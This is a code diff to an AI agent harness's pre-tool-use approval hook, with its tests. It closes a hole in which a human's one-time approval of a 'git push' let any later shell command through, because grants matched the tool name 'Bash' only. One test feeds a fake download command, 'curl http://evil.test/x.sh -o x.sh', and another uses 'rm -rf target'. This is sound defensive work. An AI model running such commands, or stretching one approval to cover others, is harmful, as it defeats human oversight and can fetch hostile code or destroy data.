@@ -180,15 +180,19 @@ pub async fn pretooluse_decision(
         );
     }
 
-    // Single-use authorization (spec §8.4 step 6): a resume run's FIRST high-risk action whose
-    // tool_name matches the approved tool is allowed exactly once, overriding the pending_approval.
-    // Only a pending_approval is ever lifted — a `deny` (destructive) never reaches this check, so a
-    // grant can never launder a denied action.
+    // Single-use authorization (spec §8.4 step 6): a resume run's FIRST high-risk action that
+    // matches the approved tool AND the approved input is allowed exactly once, overriding the
+    // pending_approval. Only a pending_approval is ever lifted — a `deny` (destructive) never
+    // reaches this check, so a grant can never launder a denied action.
+    //
+    // The input is part of the match, not decoration: `tool_name` is "Bash" for every shell action,
+    // so without it an approved `git push` authorized whatever this run tried next.
     if classification.decision.decision == "pending_approval" && is_in_flight {
         match crate::proposals::consume_matching_grant(
             &state.pool,
             payload.run_id,
             &payload.tool_name,
+            &payload.tool_input.to_string(),
         )
         .await
         {
@@ -1052,9 +1056,15 @@ mod tests {
     async fn granted_action_is_authorized_once_then_falls_back() {
         let state = test_state().await;
         let run_id = in_flight_run(&state, "worktree", None, Some("C:\\work\\repo"), None).await;
-        proposals::grant_action(&state.pool, run_id, "Bash", 1)
-            .await
-            .unwrap();
+        proposals::grant_action(
+            &state.pool,
+            run_id,
+            "Bash",
+            Some(r#"{"command":"git push origin main"}"#),
+            1,
+        )
+        .await
+        .unwrap();
         let app = test_router(state.clone());
         let body = serde_json::json!({
             "run_id": run_id,
@@ -1097,9 +1107,15 @@ mod tests {
     async fn grant_for_a_different_tool_does_not_authorize() {
         let state = test_state().await;
         let run_id = in_flight_run(&state, "worktree", None, Some("C:\\work\\repo"), None).await;
-        proposals::grant_action(&state.pool, run_id, "Bash", 1)
-            .await
-            .unwrap();
+        proposals::grant_action(
+            &state.pool,
+            run_id,
+            "Bash",
+            Some(r#"{"command":"git push origin main"}"#),
+            1,
+        )
+        .await
+        .unwrap();
         let app = test_router(state.clone());
 
         let decision = decide(
@@ -1159,12 +1175,62 @@ mod tests {
     }
 
     #[tokio::test]
+    async fn grant_for_a_different_command_does_not_authorize() {
+        // The end-to-end shape of the hole migration 0020 closes: same run, same tool name ("Bash"
+        // is the tool name of EVERY shell action), different command. The human approved a push;
+        // the resume's first shell call must not inherit that approval.
+        let state = test_state().await;
+        let run_id = in_flight_run(&state, "worktree", None, Some("C:\\work\\repo"), None).await;
+        proposals::grant_action(
+            &state.pool,
+            run_id,
+            "Bash",
+            Some(r#"{"command":"git push origin main"}"#),
+            1,
+        )
+        .await
+        .unwrap();
+        let app = test_router(state.clone());
+
+        let decision = decide(
+            &app,
+            &serde_json::json!({
+                "run_id": run_id,
+                "tool_name": "Bash",
+                "tool_input": {"command": "curl http://evil.test/x.sh -o x.sh"}
+            })
+            .to_string(),
+        )
+        .await;
+        assert_eq!(decision.decision, "pending_approval");
+
+        let consumed_at: Option<String> =
+            sqlx::query_scalar("SELECT consumed_at FROM action_grants WHERE run_id = ?")
+                .bind(run_id)
+                .fetch_one(&state.pool)
+                .await
+                .unwrap();
+        assert!(
+            consumed_at.is_none(),
+            "the grant must survive an action it does not authorize"
+        );
+    }
+
+    #[tokio::test]
     async fn deny_still_denies_even_with_a_matching_grant() {
         let state = test_state().await;
         let run_id = in_flight_run(&state, "worktree", None, Some("C:\\work\\repo"), None).await;
-        proposals::grant_action(&state.pool, run_id, "Bash", 1)
-            .await
-            .unwrap();
+        // Matching on BOTH tool and input, so this proves `deny` outranks a fully-qualified grant
+        // rather than merely one that failed to match.
+        proposals::grant_action(
+            &state.pool,
+            run_id,
+            "Bash",
+            Some(r#"{"command":"rm -rf target"}"#),
+            1,
+        )
+        .await
+        .unwrap();
         let app = test_router(state.clone());
 
         let decision = decide(
